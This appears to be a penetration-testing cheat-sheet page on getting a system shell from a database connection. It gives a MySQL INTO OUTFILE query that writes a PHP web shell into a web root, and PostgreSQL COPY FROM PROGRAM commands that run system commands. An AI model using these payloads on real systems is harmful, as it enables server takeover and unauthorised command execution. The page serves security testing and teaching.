---
description: You have a connection to a database. How can you get a shell from that?
---

# Get a Shell From DB Connection

### Write a Web Shell

Prerequisites:

* A web server that supports PHP or ASP is installed on the same server
* The database user has write permissions in a directory from where PHP or ASP can be executed through the web server

Many databases can write files to the local system. So if possible, write a web shell to the web server.

Mysql example:

```
select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE 'C:/xampp/htdocs/back.php'
```

### Databases Support Command Execution

Some databases support command execution, so you can just use that. Usually you need the highest database privileges to do it, though.

Prerequisite:

* Database system that supports command execution
* Usually requires the highest privileges that can be gained in the database (not a normal db user)

**Postgresql example** (requires login as `postgres` user)&#x20;

First, the attacker needs to create a table to hold the system command's output.

```
> CREATE TABLE cmd_exec(cmd_output text);
```

Then, they can run the system command via the COPY TO/FROM PROGRAM function.

```
> COPY cmd_exec FROM PROGRAM 'id';
```

Run longer commands like this:

```
> COPY cmd_exec FROM PROGRAM 'touch /tmp/test';
```

